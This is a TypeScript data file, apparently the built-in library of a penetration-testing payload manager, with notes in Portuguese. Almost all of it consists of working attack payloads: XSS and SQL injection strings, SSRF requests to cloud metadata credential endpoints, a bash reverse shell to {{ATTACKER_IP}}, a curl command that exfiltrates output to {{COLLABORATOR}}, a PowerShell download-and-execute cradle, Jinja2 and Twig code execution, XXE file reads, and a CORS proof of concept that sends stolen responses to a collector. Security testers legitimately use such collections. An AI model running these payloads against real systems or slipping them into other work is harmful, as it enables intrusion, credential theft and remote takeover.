import { ExploitPayload } from '../types';

export const DEFAULT_EXPLOIT_PAYLOADS: ExploitPayload[] = [
  // --- XSS (Cross-Site Scripting) ---
  {
    id: 'payload-xss-01',
    title: 'Modern SVG Script Trigger',
    category: 'XSS',
    payload: `<svg/onload=alert(document.domain)>`,
    description: 'Injeção clássica e compacta utilizando tag SVG para contornar filtros básicos de <script>.',
    context: 'HTML Body / Generic Injection',
    tags: ['svg', 'reflected', 'stored', 'quick-test'],
    isFavorite: true,
    isCustom: false,
    notes: 'Executa imediatamente no carregamento da tag SVG sem requerer interação do usuário.',
    createdAt: '2026-01-10'
  },
  {
    id: 'payload-xss-02',
    title: 'Image Error with Origin & Cookie Alert',
    category: 'XSS',
    payload: `<img src=x onerror="alert(document.domain + ' | ' + document.cookie)">`,
    description: 'Payload de imagem com fallback de erro HTTP para testar execução de script e acesso a cookies.',
    context: 'HTML Body / Attribute Breakout',
    tags: ['img', 'onerror', 'cookie-check'],
    isFavorite: true,
    isCustom: false,
    notes: 'Verifica se os cookies sensíveis estão protegidos com o atributo HttpOnly.',
    createdAt: '2026-01-10'
  },
  {
    id: 'payload-xss-03',
    title: 'HTML Attribute Breakout with Autofocus',
    category: 'XSS',
    payload: `" onfocus="alert(1)" autofocus="`,
    description: 'Bypass para quebra de atributo de input sem requerer clique do usuário através de autofocus.',
    context: 'Input Value Attribute (e.g. <input value="...">)',
    tags: ['attribute-breakout', 'autofocus', 'no-click'],
    isFavorite: false,
    isCustom: false,
    notes: 'Útil quando a entrada é refletida dentro de <input value="..."> ou <textarea>.',
    createdAt: '2026-01-11'
  },
  {
    id: 'payload-xss-04',
    title: 'Universal Polyglot XSS',
    category: 'XSS',
    payload: `jaVasCript:/*-/*\`/*\\'\`/*"/**/(/* */onerror=alert(document.domain))//%0D%0A%0d%0a//</title></style></textarea></script>--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e`,
    description: 'Polyglot abrangente projetado para escapar de múltiplos contextos (script, HTML, style, textarea e URI schemes).',
    context: 'Polyglot Contexts',
    tags: ['polyglot', 'waf-bypass', 'multi-context'],
    isFavorite: true,
    isCustom: false,
    notes: 'Excelente para fuzzing rápido quando a posição de reflexão no DOM ainda não é conhecida.',
    createdAt: '2026-01-12'
  },
  {
    id: 'payload-xss-05',
    title: 'Blind XSS Exfiltration Beacon',
    category: 'XSS',
    payload: `"><script src="https://{{COLLABORATOR}}/xss.js"></script>`,
    description: 'Injeção de script externo para detecção assíncrona de Blind XSS em painéis de suporte ou portais admin.',
    context: 'Contact Forms, Support Tickets, Profile Fields',
    tags: ['blind-xss', 'oob', 'collaborator'],
    isFavorite: false,
    isCustom: false,
    notes: 'Substitua {{COLLABORATOR}} pelo domínio do seu Burp Collaborator, Interactsh ou XSS Hunter.',
    createdAt: '2026-01-15'
  },
  {
    id: 'payload-xss-06',
    title: 'JavaScript Pseudo-Protocol HREF',
    category: 'XSS',
    payload: `javascript:alert(document.origin)//`,
    description: 'Injeção direta em atributos de links como href ou src sem validação de esquema de protocolo.',
    context: 'Link href attribute (e.g. <a href="...">)',
    tags: ['href', 'javascript-protocol', 'dom-xss'],
    isFavorite: false,
    isCustom: false,
    notes: 'Testa se URLs informadas pelo usuário bloqueiam esquemas perigosos como javascript: e data:.',
    createdAt: '2026-01-18'
  },

  // --- SQLi (SQL Injection) ---
  {
    id: 'payload-sqli-01',
    title: 'Generic Authentication Bypass',
    category: 'SQLi',
    payload: `' OR '1'='1' -- -`,
    description: 'Clássico bypass de autenticação SQL para forçar condição verdadeira em consultas de login.',
    context: 'Login / Username parameter',
    tags: ['auth-bypass', 'generic', 'quick-test'],
    isFavorite: true,
    isCustom: false,
    notes: 'Pode ser variado com admin\'-- ou \' OR 1=1 LIMIT 1 #.',
    createdAt: '2026-01-10'
  },
  {
    id: 'payload-sqli-02',
    title: 'MySQL / MariaDB Time-Based Blind (5s Delay)',
    category: 'SQLi',
    payload: `' OR IF(1=1, SLEEP(5), 0) -- -`,
    description: 'Provoca atraso intencional de 5 segundos no processamento para confirmar injeção cega sem saída de erro.',
    context: 'WHERE Clause / Filter parameter',
    tags: ['mysql', 'time-based', 'blind'],
    isFavorite: true,
    isCustom: false,
    notes: 'Verifique se a latência de resposta HTTP aumenta em ~5000ms.',
    createdAt: '2026-01-12'
  },
  {
    id: 'payload-sqli-03',
    title: 'PostgreSQL Time-Based Blind (pg_sleep)',
    category: 'SQLi',
    payload: `'; SELECT pg_sleep(5); --`,
    description: 'Chamada de pg_sleep para PostgreSQL em queries multi-statement ou injeção em parâmetro filtrado.',
    context: 'PostgreSQL Parameter',
    tags: ['postgresql', 'time-based', 'blind'],
    isFavorite: false,
    isCustom: false,
    notes: 'Caso seja in-query: \' || (SELECT pg_sleep(5)) || \'.',
    createdAt: '2026-01-14'
  },
  {
    id: 'payload-sqli-04',
    title: 'MySQL ExtractValue Error-Based Extraction',
    category: 'SQLi',
    payload: `' AND ExtractValue(1, concat(0x7e, (SELECT @@version), 0x7e)) -- -`,
    description: 'Força uma exceção de sintaxe XPath para refletir a versão do banco ou dados confidenciais na mensagem de erro.',
    context: 'Error-based MySQL injection',
    tags: ['mysql', 'error-based', 'data-leak'],
    isFavorite: true,
    isCustom: false,
    notes: 'O delimitador 0x7e (~) separa a string capturada do texto de erro padrão do MySQL.',
    createdAt: '2026-01-15'
  },
  {
    id: 'payload-sqli-05',
    title: 'Generic UNION-Based Column Enumeration',
    category: 'SQLi',
    payload: `' UNION SELECT NULL, NULL, NULL, NULL -- -`,
    description: 'Identifica o número exato de colunas retornadas pela query original incrementando os campos NULL.',
    context: 'GET/POST Parameter in SELECT query',
    tags: ['union-based', 'enumeration', 'null-test'],
    isFavorite: false,
    isCustom: false,
    notes: 'Alterne a quantidade de campos NULL (1 a 10) até que a resposta retorne HTTP 200 sem erro 500.',
    createdAt: '2026-01-18'
  },
  {
    id: 'payload-sqli-06',
    title: 'Out-of-Band (OOB) DNS Exfiltration',
    category: 'SQLi',
    payload: `'; EXEC master..xp_dirtree '\\\\{{COLLABORATOR}}\\sqli'; --`,
    description: 'Dispara requisição SMB/DNS para o listener do pesquisador a partir de bancos Microsoft SQL Server.',
    context: 'MSSQL Out-of-band injection',
    tags: ['mssql', 'oob', 'dns-exfil', 'collaborator'],
    isFavorite: false,
    isCustom: false,
    notes: 'Substitua {{COLLABORATOR}} pelo seu Burp Collaborator ou Interactsh.',
    createdAt: '2026-01-20'
  },

  // --- SSRF (Server-Side Request Forgery) ---
  {
    id: 'payload-ssrf-01',
    title: 'AWS EC2 Instance Metadata (IMDSv1)',
    category: 'SSRF',
    payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    description: 'Acesso direto ao endpoint de metadados da AWS para listar papéis de IAM e extrair credenciais temporárias de segurança.',
    context: 'URL / Webhook / Web-scraping parameter',
    tags: ['aws', 'cloud-metadata', 'imds', 'critical'],
    isFavorite: true,
    isCustom: false,
    notes: 'Se retornar nomes de roles, navegue para /iam/security-credentials/{role_name} para obter AccessKeyId e Token.',
    createdAt: '2026-01-10'
  },
  {
    id: 'payload-ssrf-02',
    title: 'Google Cloud Platform (GCP) Metadata Endpoint',
    category: 'SSRF',
    payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
    description: 'Endpoint de extração de OAuth Access Token para contas de serviço da GCP Compute Engine.',
    context: 'URL parameter with header injection',
    tags: ['gcp', 'cloud-metadata', 'token'],
    isFavorite: true,
    isCustom: false,
    notes: 'Atenção: A GCP exige o cabeçalho HTTP "Metadata-Flavor: Google" para responder requisições de metadados.',
    createdAt: '2026-01-12'
  },
  {
    id: 'payload-ssrf-03',
    title: 'Azure VM Instance Metadata Service (IMDS)',
    category: 'SSRF',
    payload: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`,
    description: 'Endpoint do Azure IMDS para extrair informações da instância, assinaturas e tokens de identidade gerenciada.',
    context: 'URL parameter',
    tags: ['azure', 'cloud-metadata', 'imds'],
    isFavorite: false,
    isCustom: false,
    notes: 'Requer o cabeçalho "Metadata: true" no Azure.',
    createdAt: '2026-01-14'
  },
  {
    id: 'payload-ssrf-04',
    title: 'Localhost IPv4 Bypass (Decimal Encoding)',
    category: 'SSRF',
    payload: `http://2130706433:8080/admin`,
    description: 'Bypass de validação de expressão regular de "127.0.0.1" ou "localhost" utilizando notação decimal direta de IP.',
    context: 'URL validator / Webhook input',
    tags: ['bypass', 'localhost', 'decimal-ip', 'waf-bypass'],
    isFavorite: true,
    isCustom: false,
    notes: '2130706433 equivale numericamente ao endereço de loopback 127.0.0.1.',
    createdAt: '2026-01-16'
  },
  {
    id: 'payload-ssrf-05',
    title: 'Out-of-Band SSRF Canary Probe',
    category: 'SSRF',
    payload: `http://{{COLLABORATOR}}/ssrf-probe-poc?timestamp={{TIMESTAMP}}`,
    description: 'Verificação inicial de conectividade externa para confirmar SSRF cego em processos assíncronos ou webhooks.',
    context: 'Webhook URL, Image URL, Web preview',
    tags: ['oob', 'blind-ssrf', 'collaborator'],
    isFavorite: false,
    isCustom: false,
    notes: 'Substitua {{COLLABORATOR}} pelo seu listener para observar conexões HTTP/DNS de saída.',
    createdAt: '2026-01-18'
  },

  // --- RCE (Remote Code Execution) ---
  {
    id: 'payload-rce-01',
    title: 'Linux Command Injection Separators (id)',
    category: 'RCE',
    payload: `; id; || id || $(id) || \`id\``,
    description: 'Bateria de delimitadores e substituições de comandos Unix (;, ||, $(), ``) para confirmar injeção de shell.',
    context: 'CLI parameters, PDF generators, ping/traceroute tools',
    tags: ['command-injection', 'linux', 'critical'],
    isFavorite: true,
    isCustom: false,
    notes: 'Procure por "uid=..." na resposta HTTP.',
    createdAt: '2026-01-10'
  },
  {
    id: 'payload-rce-02',
    title: 'Out-of-Band DNS Data Exfiltration (Linux)',
    category: 'RCE',
    payload: `; curl http://{{COLLABORATOR}}/?data=$(whoami|base64) ;`,
    description: 'Exfiltração de dados via requisição HTTP externa com saída codificada em Base64 para confirmar RCE cego.',
    context: 'Blind Command Injection',
    tags: ['oob', 'dns-exfil', 'blind-rce', 'collaborator'],
    isFavorite: true,
    isCustom: false,
    notes: 'Excelente para situações onde a saída do comando não é renderizada na resposta HTTP.',
    createdAt: '2026-01-12'
  },
  {
    id: 'payload-rce-03',
    title: 'Interactive Bash Reverse Shell',
    category: 'RCE',
    payload: `bash -c 'bash -i >& /dev/tcp/{{ATTACKER_IP}}/4444 0>&1'`,
    description: 'Spawn de shell interativa Bash com redirecionamento de descritores de arquivo via /dev/tcp.',
    context: 'Confirmed RCE / Shell drop',
    tags: ['reverse-shell', 'bash', 'interactive'],
    isFavorite: false,
    isCustom: false,
    notes: 'Inicie previamente "nc -lvnp 4444" no servidor de controle antes de disparar o payload.',
    createdAt: '2026-01-15'
  },
  {
    id: 'payload-rce-04',
    title: 'Windows PowerShell Download & Exec in Memory',
    category: 'RCE',
    payload: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{{COLLABORATOR}}/payload.ps1')"`,
    description: 'Execução de script em memória no Windows sem gravar artefatos em disco, contornando proteções básicas.',
    context: 'Windows OS Command Injection',
    tags: ['windows', 'powershell', 'in-memory'],
    isFavorite: false,
    isCustom: false,
    notes: 'Certifique-se de configurar o listener HTTP para servir o arquivo payload.ps1.',
    createdAt: '2026-01-19'
  },

  // --- SSTI (Server-Side Template Injection) ---
  {
    id: 'payload-ssti-01',
    title: 'Polyglot Template Engine Arithmetic Probe',
    category: 'SSTI',
    payload: `${'{' + '{7*7}' + '}'}[[7*7]]${'${7*7}'}`,
    description: 'Sonda universal que testa avaliação de expressões aritméticas (49) em múltiplos engines (Jinja2, Twig, Smarty, Freemarker).',
    context: 'Template inputs, Custom email builders, Profile names',
    tags: ['polyglot', 'probe', 'arithmetic'],
    isFavorite: true,
    isCustom: false,
    notes: 'Se a resposta renderizar 49 ao invés de {{7*7}}, a injeção no template está confirmada.',
    createdAt: '2026-01-11'
  },
  {
    id: 'payload-ssti-02',
    title: 'Jinja2 (Python / Flask) Arbitrary Command Execution',
    category: 'SSTI',
    payload: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`,
    description: 'Payload avançado para Jinja2 que navega pela hierarquia de globais do Python para executar comandos via os.popen.',
    context: 'Flask / Python Jinja2 applications',
    tags: ['jinja2', 'python', 'rce'],
    isFavorite: true,
    isCustom: false,
    notes: 'Evita a busca manual por subclasses de object() e funciona em versões recentes do Jinja2.',
    createdAt: '2026-01-14'
  },
  {
    id: 'payload-ssti-03',
    title: 'Twig (PHP) System Filter Command Execution',
    category: 'SSTI',
    payload: `{{['id']|filter('system')}}`,
    description: 'Executa o comando "id" no sistema operacional utilizando o filtro de array nativo do motor Twig (PHP).',
    context: 'Symfony / Twig PHP applications',
    tags: ['twig', 'php', 'rce'],
    isFavorite: false,
    isCustom: false,
    notes: 'Válido para versões Twig v2 e v3.',
    createdAt: '2026-01-16'
  },

  // --- XXE (XML External Entity) ---
  {
    id: 'payload-xxe-01',
    title: 'Classic Local File Disclosure (/etc/passwd)',
    category: 'XXE',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>`,
    description: 'Entidade XML externa clássica para leitura do arquivo /etc/passwd em parsers com resolução de entidades ativada.',
    context: 'XML Body (SOAP, SAML, SVG, Office uploads)',
    tags: ['file-read', 'etc-passwd', 'classic'],
    isFavorite: true,
    isCustom: false,
    notes: 'Testar em endpoints com Content-Type: application/xml ou text/xml.',
    createdAt: '2026-01-10'
  },
  {
    id: 'payload-xxe-02',
    title: 'Out-of-Band (Blind) Parameter Entity DTD',
    category: 'XXE',
    payload: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://{{COLLABORATOR}}/evil.dtd">
  %ext;
]>
<root><test>poc</test></root>`,
    description: 'Entidade de parâmetro (%ext;) para disparar download de DTD externo e exfiltrar arquivos de forma cega via DNS/HTTP.',
    context: 'Blind XML endpoints without direct output',
    tags: ['blind-xxe', 'oob', 'dtd', 'collaborator'],
    isFavorite: false,
    isCustom: false,
    notes: 'Hospede um evil.dtd no seu servidor para capturar o conteúdo do arquivo desejado.',
    createdAt: '2026-01-13'
  },
  {
    id: 'payload-xxe-03',
    title: 'SVG Image File Disclosure Payload',
    category: 'XXE',
    payload: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="10" y="20">&xxe;</text>
</svg>`,
    description: 'Arquivo SVG formatado para vazar o hostname do servidor durante o processamento de imagens/avatares.',
    context: 'Image upload / Profile avatar (.svg)',
    tags: ['svg', 'image-upload', 'hostname'],
    isFavorite: false,
    isCustom: false,
    notes: 'Faça o upload como avatar.svg e inspecione a imagem renderizada para visualizar o texto extraído.',
    createdAt: '2026-01-17'
  },

  // --- IDOR / Broken Access Control ---
  {
    id: 'payload-idor-01',
    title: 'HTTP Method Spoofing & Verb Tampering',
    category: 'IDOR',
    payload: `X-HTTP-Method-Override: PUT
X-Original-URL: /admin/users
X-Rewrite-URL: /api/v1/private`,
    description: 'Cabeçalhos customizados para forçar métodos HTTP protegidos (PUT, DELETE) ou reescrever a rota do proxy reverso.',
    context: 'HTTP Headers in REST APIs',
    tags: ['method-override', 'headers', 'access-control'],
    isFavorite: true,
    isCustom: false,
    notes: 'Testar quando métodos PUT/DELETE são bloqueados por WAF ou proxies intermediários.',
    createdAt: '2026-01-11'
  },
  {
    id: 'payload-idor-02',
    title: 'HTTP Parameter Pollution (HPP) Array Tamper',
    category: 'IDOR',
    payload: `?userId=1024&userId=1`,
    description: 'Duplicação de parâmetros para explorar divergências de interpretação entre o WAF (primeiro valor) e o backend (último valor).',
    context: 'Query String / URL parameter',
    tags: ['hpp', 'parameter-pollution', 'bypass'],
    isFavorite: false,
    isCustom: false,
    notes: 'Observe se o backend seleciona o valor do admin (1) em vez do usuário comum.',
    createdAt: '2026-01-15'
  },

  // --- LFI / Path Traversal ---
  {
    id: 'payload-lfi-01',
    title: 'Deep Path Traversal with Null-Byte Alternate',
    category: 'LFI',
    payload: `../../../../../../../../../../etc/passwd`,
    description: 'Sequência profunda de diretórios relativos para escapar de pastas raiz e acessar o /etc/passwd.',
    context: 'File download / View template parameter (e.g. ?file=)',
    tags: ['path-traversal', 'directory-traversal', 'etc-passwd'],
    isFavorite: true,
    isCustom: false,
    notes: 'Caso haja extensão forçada (ex: .png), tente acrescentar %00 ou carregar como ?file=....//....//etc/passwd.',
    createdAt: '2026-01-10'
  },
  {
    id: 'payload-lfi-02',
    title: 'PHP Filter Base64 Source Code Extraction',
    category: 'LFI',
    payload: `php://filter/convert.base64-encode/resource=index.php`,
    description: 'Wrapper oficial do PHP que intercepta a execução do arquivo e o retorna codificado em Base64 para leitura do código-fonte.',
    context: 'PHP include() / require() statements',
    tags: ['php-wrapper', 'base64', 'source-leak'],
    isFavorite: true,
    isCustom: false,
    notes: 'Decodifique a string Base64 obtida para ler a lógica confidencial do script PHP sem executá-lo.',
    createdAt: '2026-01-13'
  },

  // --- Open Redirect ---
  {
    id: 'payload-redirect-01',
    title: 'Protocol-Relative Double Slash Bypass',
    category: 'Open Redirect',
    payload: `//{{COLLABORATOR}}`,
    description: 'Utiliza barra dupla para herdar o protocolo HTTP/HTTPS atual e redirecionar para um host arbitrário.',
    context: 'Redirect / ReturnURL parameter (e.g. ?return_url=)',
    tags: ['protocol-relative', 'quick-test'],
    isFavorite: true,
    isCustom: false,
    notes: 'Muitos filtros verificam se a URL começa com http mas ignoram a sintaxe padrão //.',
    createdAt: '2026-01-12'
  },
  {
    id: 'payload-redirect-02',
    title: 'Authority Separator & URL Fragment Bypass',
    category: 'Open Redirect',
    payload: `https://{{TARGET}}@{{COLLABORATOR}}`,
    description: 'Aproveita a especificação de autoridade RFC (user:pass@host) para enganar validadores de prefixo de domínio.',
    context: 'Redirect parameter',
    tags: ['authority-bypass', 'url-parser'],
    isFavorite: false,
    isCustom: false,
    notes: 'O navegador ignora o prefixo {{TARGET}}@ e estabelece conexão com {{COLLABORATOR}}.',
    createdAt: '2026-01-16'
  },

  // --- CORS / CSRF ---
  {
    id: 'payload-cors-01',
    title: 'Exploit PoC: Arbitrary Origin with Credentials',
    category: 'CORS / CSRF',
    payload: `<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    fetch('https://{{COLLABORATOR}}/log?data=' + encodeURIComponent(this.responseText));
  };
  req.open('GET', 'https://{{TARGET}}/api/user/private-profile', true);
  req.withCredentials = true;
  req.send();
</script>`,
    description: 'PoC HTML que extrai respostas confidenciais de endpoints com política de CORS permissiva (Access-Control-Allow-Origin: * ou Origin refletida).',
    context: 'Cross-Origin API Endpoints',
    tags: ['cors', 'credentials', 'data-theft', 'poc'],
    isFavorite: true,
    isCustom: false,
    notes: 'Requer que o endpoint configure Access-Control-Allow-Credentials: true.',
    createdAt: '2026-01-14'
  }
];

export const PAYLOAD_CATEGORIES: {
  category: import('../types').PayloadVulnerabilityCategory;
  label: string;
  badgeColor: string;
  iconName: string;
  description: string;
}[] = [
  {
    category: 'XSS',
    label: 'Cross-Site Scripting (XSS)',
    badgeColor: 'bg-emerald-500/15 text-emerald-400 border-emerald-500/30',
    iconName: 'Code',
    description: 'Payloads refletidos, armazenados, baseados em DOM, SVG e evasão de filtros WAF.'
  },
  {
    category: 'SQLi',
    label: 'SQL Injection (SQLi)',
    badgeColor: 'bg-rose-500/15 text-rose-400 border-rose-500/30',
    iconName: 'Database',
    description: 'Injeções baseadas em tempo, erros de sintaxe, UNION-based e exfiltração OOB.'
  },
  {
    category: 'SSRF',
    label: 'Server-Side Request Forgery (SSRF)',
    badgeColor: 'bg-orange-500/15 text-orange-400 border-orange-500/30',
    iconName: 'Globe',
    description: 'Metadados de nuvem (AWS IMDS, GCP, Azure), bypasses de localhost e sondas OOB.'
  },
  {
    category: 'RCE',
    label: 'Remote Code Execution (RCE)',
    badgeColor: 'bg-red-500/15 text-red-400 border-red-500/30',
    iconName: 'Terminal',
    description: 'Injeção de comandos de shell Linux/Windows, reverse shells e exfiltração de stdout.'
  },
  {
    category: 'SSTI',
    label: 'Server-Side Template Injection (SSTI)',
    badgeColor: 'bg-purple-500/15 text-purple-400 border-purple-500/30',
    iconName: 'Cpu',
    description: 'Escapada de sandbox em Jinja2, Twig, SpEL e probes aritméticos de detecção.'
  },
  {
    category: 'XXE',
    label: 'XML External Entity (XXE)',
    badgeColor: 'bg-amber-500/15 text-amber-400 border-amber-500/30',
    iconName: 'FileCode',
    description: 'Leitura de arquivos locais (/etc/passwd, win.ini), blind XXE e vetores via SVG.'
  },
  {
    category: 'IDOR',
    label: 'IDOR & Access Control',
    badgeColor: 'bg-cyan-500/15 text-cyan-400 border-cyan-500/30',
    iconName: 'ShieldAlert',
    description: 'Bypasses de controle de acesso, poluição de parâmetros (HPP) e spoofing de verbos HTTP.'
  },
  {
    category: 'LFI',
    label: 'Local File Inclusion & Traversal',
    badgeColor: 'bg-yellow-500/15 text-yellow-400 border-yellow-500/30',
    iconName: 'Folder',
    description: 'Directory traversal profundo, wrappers de decodificação PHP e bypasses de extensão.'
  },
  {
    category: 'Open Redirect',
    label: 'Open Redirect',
    badgeColor: 'bg-sky-500/15 text-sky-400 border-sky-500/30',
    iconName: 'ExternalLink',
    description: 'Bypasses de redirecionamento arbitrário via //, esquemas de autoridade e CRLF.'
  },
  {
    category: 'CORS / CSRF',
    label: 'CORS Misconfig & CSRF',
    badgeColor: 'bg-indigo-500/15 text-indigo-400 border-indigo-500/30',
    iconName: 'Share2',
    description: 'Scripts de PoC para extração de dados com credenciais e origens permissivas.'
  },
  {
    category: 'Other',
    label: 'Outras Técnicas',
    badgeColor: 'bg-zinc-500/15 text-zinc-400 border-zinc-500/30',
    iconName: 'Layers',
    description: 'Payloads customizados, cabeçalhos de bypass e testes especializados de segurança.'
  }
];
